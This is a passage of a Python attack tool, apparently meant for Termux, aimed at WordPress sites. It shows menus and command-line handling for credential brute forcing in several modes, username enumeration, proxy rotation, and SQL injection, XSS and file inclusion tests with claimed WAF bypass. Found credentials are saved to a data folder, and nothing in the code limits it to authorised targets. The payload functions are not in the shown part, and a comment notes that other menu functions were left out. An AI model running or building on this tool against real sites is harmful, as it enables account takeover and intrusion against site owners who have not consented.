            rating = "EXCELLENT 🟢"
        elif score >= 60:
            score_color = Fore.YELLOW
            rating = "GOOD 🟡"
        elif score >= 40:
            score_color = Fore.YELLOW
            rating = "FAIR 🟠"
        else:
            score_color = Fore.RED
            rating = "POOR 🔴"
        
        print(f"\n{Fore.WHITE}Security Score: {score_color}{score}% {rating}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Target: {Fore.CYAN}{self.base_url}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Duration: {Fore.CYAN}{self.results['scan_info']['duration']:.1f}s{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Environment: {Fore.CYAN}{self.results['scan_info'].get('environment', 'Unknown')}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}📈 Statistics:{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}✅ Passed: {self.stats['passed']}{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}⚠️ Warnings: {self.stats['warnings']}{Style.RESET_ALL}")
        print(f"  {Fore.RED}❌ Failed: {self.stats['failed']}{Style.RESET_ALL}")
        print(f"  {Fore.RED}🔥 Critical: {self.stats['critical']}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}📊 Total Tests: {self.stats['total_tests']}{Style.RESET_ALL}")
        
        # Critical Issues
        if self.results["critical_issues"]:
            print(f"\n{Fore.RED}🚨 CRITICAL ISSUES ({len(self.results['critical_issues'])}):{Style.RESET_ALL}")
            for i, issue in enumerate(self.results["critical_issues"][:3], 1):
                print(f"  {Fore.RED}{i}. {issue['issue']}{Style.RESET_ALL}")
                if issue['url']:
                    print(f"     {Fore.CYAN}📎 URL: {issue['url'][:60]}...{Style.RESET_ALL}")
            if len(self.results["critical_issues"]) > 3:
                print(f"  {Fore.YELLOW}... and {len(self.results['critical_issues']) - 3} more{Style.RESET_ALL}")
        
        # Found Credentials
        if self.results["brute_force_results"]["successful_logins"]:
            print(f"\n{Fore.RED}🔑 VALID CREDENTIALS FOUND:{Style.RESET_ALL}")
            for i, cred in enumerate(self.results["brute_force_results"]["successful_logins"][:3], 1):
                print(f"  {Fore.RED}{i}. {cred}{Style.RESET_ALL}")
            if len(self.results["brute_force_results"]["successful_logins"]) > 3:
                print(f"  {Fore.YELLOW}... and {len(self.results['brute_force_results']['successful_logins']) - 3} more{Style.RESET_ALL}")
        
        # Valid Usernames Found
        if self.results["brute_force_results"]["valid_usernames_found"]:
            print(f"\n{Fore.YELLOW}👤 VALID USERNAMES FOUND:{Style.RESET_ALL}")
            for i, username in enumerate(self.results["brute_force_results"]["valid_usernames_found"][:3], 1):
                print(f"  {Fore.YELLOW}{i}. {username}{Style.RESET_ALL}")
            if len(self.results["brute_force_results"]["valid_usernames_found"]) > 3:
                print(f"  {Fore.YELLOW}... and {len(self.results['brute_force_results']['valid_usernames_found']) - 3} more{Style.RESET_ALL}")
        
        # Report files
        print(f"\n{Fore.GREEN}📁 Reports Generated:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}• Text Report: {self.reports_dir}/security_report_*.txt{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}• JSON Report: {self.reports_dir}/security_report_*.json{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}• Found Data: {self.found_dir}/ (credentials, usernames, etc.){Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}💡 Next Steps:{Style.RESET_ALL}")
        if self.results["critical_issues"]:
            print(f"  {Fore.RED}1. 🔥 Address critical issues immediately{Style.RESET_ALL}")
        if self.results["brute_force_results"]["successful_logins"]:
            print(f"  {Fore.RED}2. 🔐 Change all passwords immediately{Style.RESET_ALL}")
        if self.results["brute_force_results"]["valid_usernames_found"]:
            print(f"  {Fore.YELLOW}3. 👤 Review discovered usernames{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}4. 📄 Review the full report for details{Style.RESET_ALL}")
        print(f"  {Fore.GREEN}5. 🛡️ Implement recommendations to improve security{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"Scan completed at {datetime.now().strftime('%H:%M:%S')}")
        print(f"{'='*80}{Style.RESET_ALL}")

    def interactive_menu(self):
        """Interactive menu system optimized for Termux"""
        while True:
            print(f"\n{Fore.CYAN}{'='*80}")
            print(f"🔧 WORDPRESS ULTIMATE SECURITY TESTER v5.1 - TERMUX")
            print(f"{'='*80}{Style.RESET_ALL}")
            
            menu_options = [
                ("1", "Run Comprehensive Security Scan", self.run_comprehensive_scan),
                ("2", "Advanced Brute Force Attack", self.advanced_brute_force_menu),
                ("3", "Test Specific Vulnerability", self.vulnerability_test_menu),
                ("4", "Username Enumeration Test", self.username_enumeration_test),
                ("5", "Load Custom Wordlists", self.wordlist_menu),
                ("6", "Configure Proxy Settings", self.proxy_config_menu),
                ("7", "View Current Results", self.view_results),
                ("8", "Generate Report", self.generate_reports),
                ("9", "Test Single Credential", self.test_single_credential_menu),
                ("10", "Scan Settings", self.scan_settings_menu),
                ("11", "Show All Commands with Examples", self.show_all_commands),
                ("12", "Check Termux Environment", self.check_termux_environment),
                ("0", "Exit", None)
            ]
            
            for option, text, _ in menu_options:
                print(f"{Fore.YELLOW}{option}. {Fore.WHITE}{text}{Style.RESET_ALL}")
            
            print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
            
            try:
                choice = input(f"\n{Fore.GREEN}Select option (0-12): {Style.RESET_ALL}").strip()
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
                break
            
            if choice == '0':
                print(f"\n{Fore.GREEN}[+] Exiting... Goodbye!{Style.RESET_ALL}")
                break
            
            for option, text, function in menu_options:
                if choice == option and function:
                    function()
                    break
            else:
                print(f"{Fore.RED}[!] Invalid option!{Style.RESET_ALL}")
    
    def check_termux_environment(self):
        """Check and display Termux environment information"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"📱 TERMUX ENVIRONMENT CHECK")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}System Information:{Style.RESET_ALL}")
        print(f"  Python Version: {sys.version}")
        print(f"  Platform: {sys.platform}")
        print(f"  Termux Home: {self.termux_home}")
        print(f"  Is Termux: {self.is_termux}")
        
        print(f"\n{Fore.YELLOW}Tool Configuration:{Style.RESET_ALL}")
        print(f"  Output Directory: {self.output_dir}")
        print(f"  Default Delay: {self.delay}s")
        print(f"  Default Timeout: {self.timeout}s")
        print(f"  Wordlists Directory: {self.wordlists_dir}")
        
        print(f"\n{Fore.YELLOW}Directory Contents:{Style.RESET_ALL}")
        for dir_path in [self.output_dir, self.wordlists_dir, self.reports_dir, self.found_dir]:
            if os.path.exists(dir_path):
                file_count = len([f for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f))])
                print(f"  {dir_path}: {file_count} files")
            else:
                print(f"  {dir_path}: Directory not found")
        
        print(f"\n{Fore.GREEN}[*] Environment check completed{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
    
    def advanced_brute_force_menu(self):
        """Advanced brute force attack menu for Termux"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"🔑 ADVANCED BRUTE FORCE ATTACK - TERMUX")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Current Configuration:{Style.RESET_ALL}")
        print(f"  Usernames: {len(self.username_list)} loaded")
        print(f"  Passwords: {len(self.password_list)} loaded")
        print(f"  Valid Usernames Found: {len(self.valid_usernames)}")
        print(f"  Proxy: {'Enabled' if self.proxy_list else 'Disabled'}")
        print(f"  Delay: {self.delay}s between requests")
        
        print(f"\n{Fore.YELLOW}Attack Modes:{Style.RESET_ALL}")
        modes = [
            ("1", "Full Attack (Username + Password lists)"),
            ("2", "Username List + Specific Password"),
            ("3", "Specific Username + Password List"),
            ("4", "Test Single Username/Password"),
            ("5", "Username Enumeration Only"),
            ("6", "Configure Attack Parameters"),
            ("7", "Back to Main Menu")
        ]
        
        for option, text in modes:
            print(f"{Fore.CYAN}{option}. {Fore.WHITE}{text}{Style.RESET_ALL}")
        
        try:
            choice = input(f"\n{Fore.GREEN}Select mode (1-7): {Style.RESET_ALL}").strip()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Operation cancelled{Style.RESET_ALL}")
            return
        
        if choice == '1':
            print(f"\n{Fore.YELLOW}[*] Mode: Full Attack (Username List + Password List){Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Example: Testing {len(self.username_list)} usernames with {len(self.password_list)} passwords{Style.RESET_ALL}")
            self.advanced_brute_force_attack(mode="both")
        elif choice == '2':
            try:
                password = input(f"{Fore.YELLOW}Enter specific password: {Style.RESET_ALL}").strip()
                if password:
                    print(f"\n{Fore.YELLOW}[*] Mode: Username List + Specific Password{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Example: Testing {len(self.username_list)} usernames with password: {password}{Style.RESET_ALL}")
                    self.advanced_brute_force_attack(mode="username_only", specific_password=password)
                else:
                    print(f"{Fore.RED}[!] Password required{Style.RESET_ALL}")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled{Style.RESET_ALL}")
        elif choice == '3':
            try:
                username = input(f"{Fore.YELLOW}Enter specific username: {Style.RESET_ALL}").strip()
                if username:
                    print(f"\n{Fore.YELLOW}[*] Mode: Specific Username + Password List{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Example: Testing username: {username} with {len(self.password_list)} passwords{Style.RESET_ALL}")
                    self.advanced_brute_force_attack(mode="password_only", specific_username=username)
                else:
                    print(f"{Fore.RED}[!] Username required{Style.RESET_ALL}")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled{Style.RESET_ALL}")
        elif choice == '4':
            try:
                username = input(f"{Fore.YELLOW}Enter username: {Style.RESET_ALL}").strip()
                password = input(f"{Fore.YELLOW}Enter password: {Style.RESET_ALL}").strip()
                if username and password:
                    print(f"\n{Fore.YELLOW}[*] Mode: Single Credential Test{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Testing: {username}:{password}{Style.RESET_ALL}")
                    self.advanced_brute_force_attack(mode="single", 
                                                    specific_username=username,
                                                    specific_password=password)
                else:
                    print(f"{Fore.RED}[!] Both username and password required{Style.RESET_ALL}")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled{Style.RESET_ALL}")
        elif choice == '5':
            print(f"\n{Fore.YELLOW}[*] Running username enumeration only{Style.RESET_ALL}")
            self.username_enumeration_test()
        elif choice == '6':
            self.configure_attack_parameters()
        elif choice == '7':
            return
        else:
            print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
    
    # ... (بقیه توابع منوها مشابه نسخه قبلی با بهینه‌سازی برای Termux)

def print_usage():
    """Print usage instructions optimized for Termux"""
    print(f"""
{Fore.CYAN}WordPress Ultimate Security Tester v5.1 - Termux Edition{Style.RESET_ALL}

{Fore.YELLOW}📱 Basic Usage for Termux:{Style.RESET_ALL}
  python3 wp_security_tester.py --url https://example.com

{Fore.YELLOW}⚙️ Advanced Options:{Style.RESET_ALL}
  --url URL              Target WordPress site URL (required)
  --proxy PROXY          Use proxy (e.g., http://127.0.0.1:8080)
  --userlist FILE        Custom username wordlist
  --passlist FILE        Custom password wordlist
  --proxylist FILE       Proxy list file
  --delay SECONDS        Delay between requests (default: 1.0 for Termux)
  --workers NUM          Number of concurrent workers (default: 5 for Termux)
  --username USER        Specific username for brute force
  --password PASS        Specific password for brute force
  --full                 Run full comprehensive scan
  --brute                Run brute force attack only
  --vuln TYPE            Test specific vulnerability (can use multiple times)
  --help                 Show this help message

{Fore.YELLOW}🔥 Brute Force Modes:{Style.RESET_ALL}
  Mode 1: Full attack (Username List + Password List)
    python3 wp_security_tester.py --url https://example.com --brute
  
  Mode 2: Username list + Specific password
    python3 wp_security_tester.py --url https://example.com --brute --password admin123
  
  Mode 3: Specific username + Password list
    python3 wp_security_tester.py --url https://example.com --brute --username admin
  
  Mode 4: Single credential test
    python3 wp_security_tester.py --url https://example.com --brute --username admin --password admin123

{Fore.YELLOW}🔍 Vulnerability Types:{Style.RESET_ALL}
  sql       - SQL Injection (with WAF bypass techniques)
  xss       - Cross-Site Scripting (multiple contexts)
  lfi       - Local File Inclusion (path traversal)
  rfi       - Remote File Inclusion

{Fore.YELLOW}📱 Termux Specific Examples:{Style.RESET_ALL}
  # Complete security assessment on Termux
  python3 wp_security_tester.py --url https://wordpress-site.com --full --delay 1.5
  
  # Brute force with reduced workers for Termux
  python3 wp_security_tester.py --url https://target.com --brute --workers 3 --delay 2
  
  # Test multiple vulnerabilities
  python3 wp_security_tester.py --url https://target.com --vuln sql --vuln xss
  
  # Single credential test
  python3 wp_security_tester.py --url https://target.com --brute --username admin --password P@ssw0rd!
  
  # All tests combined with Termux optimizations
  python3 wp_security_tester.py --url https://target.com --full --brute --workers 3 --delay 1.5

{Fore.YELLOW}🎮 Interactive Mode (Recommended for Termux):{Style.RESET_ALL}
  python3 wp_security_tester.py

{Fore.YELLOW}⚠️ Termux Tips:{Style.RESET_ALL}
  • Use --delay 1.5 or higher for mobile networks
  • Limit --workers to 3-5 for Termux performance
  • Output saved to ~/wp_security_results/
  • Install missing packages: pkg install python
  • Check storage: termux-setup-storage
    """)

def main():
    """Main entry point optimized for Termux"""
    import argparse
    
    parser = argparse.ArgumentParser(description='WordPress Ultimate Security Tester v5.1 - Termux Edition', 
                                     add_help=False,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    
    parser.add_argument('--url', help='Target WordPress URL')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--userlist', help='Username wordlist file')
    parser.add_argument('--passlist', help='Password wordlist file')
    parser.add_argument('--proxylist', help='Proxy list file')
    parser.add_argument('--delay', type=float, default=1.0, help='Delay between requests (default: 1.0 for Termux)')
    parser.add_argument('--workers', type=int, default=5, help='Number of workers (default: 5 for Termux)')
    parser.add_argument('--username', help='Specific username for brute force')
    parser.add_argument('--password', help='Specific password for brute force')
    parser.add_argument('--full', action='store_true', help='Run full scan')
    parser.add_argument('--brute', action='store_true', help='Run brute force only')
    parser.add_argument('--vuln', help='Test specific vulnerability (can be used multiple times)', action='append')
    parser.add_argument('--help', action='store_true', help='Show help')
    
    try:
        args = parser.parse_args()
    except SystemExit:
        print_usage()
        return
    
    if args.help or len(sys.argv) == 1:
        print_usage()
        
        if len(sys.argv) == 1:
            # Interactive mode for Termux
            print(f"\n{Fore.CYAN}Starting interactive mode...{Style.RESET_ALL}")
            
            try:
                url = input(f"{Fore.YELLOW}Enter WordPress site URL: {Style.RESET_ALL}").strip()
                if not url:
                    print(f"{Fore.RED}[!] URL is required{Style.RESET_ALL}")
                    return
                
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                
                proxy = input(f"{Fore.YELLOW}Proxy URL (optional, e.g., http://127.0.0.1:8080): {Style.RESET_ALL}").strip()
                proxies = {'http': proxy, 'https': proxy} if proxy else None
                
                # Ask for Termux-specific settings
                print(f"\n{Fore.YELLOW}Termux Settings:{Style.RESET_ALL}")
                delay_input = input(f"{Fore.YELLOW}Delay between requests (default 1.0s): {Style.RESET_ALL}").strip()
                delay = float(delay_input) if delay_input else 1.0
                
                workers_input = input(f"{Fore.YELLOW}Number of workers (default 3): {Style.RESET_ALL}").strip()
                workers = int(workers_input) if workers_input else 3
                
                tester = WordPressSecurityTester(base_url=url, proxies=proxies, delay=delay)
                tester.interactive_menu()
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Invalid number input{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        return
    
    if not args.url:
        print(f"{Fore.RED}[!] URL is required. Use --url option.{Style.RESET_ALL}")
        print_usage()
        return
    
    # Configure tester with Termux optimizations
    proxies = None
    if args.proxy:
        proxies = {'http': args.proxy, 'https': args.proxy}
    
    # Adjust settings for Termux
    if args.delay < 0.5:
        print(f"{Fore.YELLOW}[!] Delay too low for Termux. Increasing to 1.0s{Style.RESET_ALL}")
        args.delay = 1.0
    
    if args.workers > 10:
        print(f"{Fore.YELLOW}[!] Too many workers for Termux. Reducing to 5{Style.RESET_ALL}")
        args.workers = 5
    
    tester = WordPressSecurityTester(
        base_url=args.url,
        proxies=proxies,
        delay=args.delay
    )
    
    # Load custom wordlists if provided
    if args.userlist:
        if os.path.exists(args.userlist):
            tester.load_wordlists(username_file=args.userlist)
        else:
            print(f"{Fore.YELLOW}[!] Userlist file not found: {args.userlist}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Using default wordlists{Style.RESET_ALL}")
            tester.load_wordlists()
    
    if args.passlist:
        if os.path.exists(args.passlist):
            tester.load_wordlists(password_file=args.passlist)
        else:
            print(f"{Fore.YELLOW}[!] Passlist file not found: {args.passlist}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Using default wordlists{Style.RESET_ALL}")
            tester.load_wordlists()
    
    if args.proxylist:
        tester.load_proxy_list(args.proxylist)
    
    # Run requested tests
    if args.full:
        tester.run_comprehensive_scan()
    
    if args.brute:
        # Determine brute force mode based on provided parameters
        if args.username and args.password:
            # Single credential test
            tester.advanced_brute_force_attack(mode="single", 
                                             specific_username=args.username,
                                             specific_password=args.password,
                                             max_workers=args.workers)
        elif args.username:
            # Specific username + password list
            tester.advanced_brute_force_attack(mode="password_only",
                                             specific_username=args.username,
                                             max_workers=args.workers)
        elif args.password:
            # Username list + specific password
            tester.advanced_brute_force_attack(mode="username_only",
                                             specific_password=args.password,
                                             max_workers=args.workers)
        else:
            # Full attack (username list + password list)
            tester.advanced_brute_force_attack(mode="both",
                                             max_workers=args.workers)
    
    if args.vuln:
        vulnerability_tests = {
            'sql': tester.advanced_sql_injection_test,
            'xss': tester.advanced_xss_test,
            'lfi': tester.advanced_file_inclusion_test,
            'rfi': tester.advanced_file_inclusion_test,
        }
        
        for vuln_type in args.vuln:
            if vuln_type in vulnerability_tests:
                print(f"\n{Fore.YELLOW}[*] Testing {vuln_type.upper()} vulnerability...{Style.RESET_ALL}")
                vulnerability_tests[vuln_type]()
            else:
                print(f"{Fore.RED}[!] Unknown vulnerability type: {vuln_type}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Available types: {', '.join(vulnerability_tests.keys())}{Style.RESET_ALL}")
    
    # If no specific tests requested, run interactive mode
    if not (args.full or args.brute or args.vuln):
        tester.interactive_menu()

# Termux specific optimizations
def setup_termux_directories():
    """Setup directories for Termux"""
    home_dir = os.path.expanduser('~')
    wp_dir = os.path.join(home_dir, "wp_security_results")
    
    directories = [
        wp_dir,
        os.path.join(wp_dir, "reports"),
        os.path.join(wp_dir, "wordlists"),
        os.path.join(wp_dir, "logs"),
        os.path.join(wp_dir, "found_data"),
    ]
    
    for directory in directories:
        try:
            os.makedirs(directory, exist_ok=True)
            print(f"{Fore.GREEN}[+] Created directory: {directory}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error creating directory {directory}: {str(e)}{Style.RESET_ALL}")
    
    return wp_dir

def check_dependencies():
    """Check and install required dependencies for Termux"""
    print(f"{Fore.CYAN}[*] Checking dependencies...{Style.RESET_ALL}")
    
    required_modules = ['requests', 'colorama', 'bs4']
    missing_modules = []
    
    for module in required_modules:
        try:
            __import__(module)
            print(f"{Fore.GREEN}[+] Module found: {module}{Style.RESET_ALL}")
        except ImportError:
            missing_modules.append(module)
            print(f"{Fore.YELLOW}[!] Module missing: {module}{Style.RESET_ALL}")
    
    if missing_modules:
        print(f"{Fore.YELLOW}[*] Installing missing modules...{Style.RESET_ALL}")
        try:
            import subprocess
            for module in missing_modules:
                subprocess.check_call([sys.executable, "-m", "pip", "install", module])
            print(f"{Fore.GREEN}[+] All modules installed successfully{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error installing modules: {str(e)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Try: pip install {' '.join(missing_modules)}{Style.RESET_ALL}")
    
    # Check for Termux storage permission
    termux_home = os.path.expanduser('~')
    if '/data/data/com.termux' in termux_home:
        storage_dir = os.path.join(termux_home, "storage")
        if not os.path.exists(storage_dir):
            print(f"{Fore.YELLOW}[!] Termux storage not setup{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Run: termux-setup-storage{Style.RESET_ALL}")
    
    return len(missing_modules) == 0

if __name__ == "__main__":
    try:
        # Termux specific setup
        if '/data/data/com.termux' in os.path.expanduser('~'):
            print(f"{Fore.CYAN}[*] Running in Termux environment{Style.RESET_ALL}")
            setup_termux_directories()
        
        # Check dependencies
        if not check_dependencies():
            print(f"{Fore.YELLOW}[!] Some dependencies may be missing{Style.RESET_ALL}")
        
        # Run main function
        main()
        
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)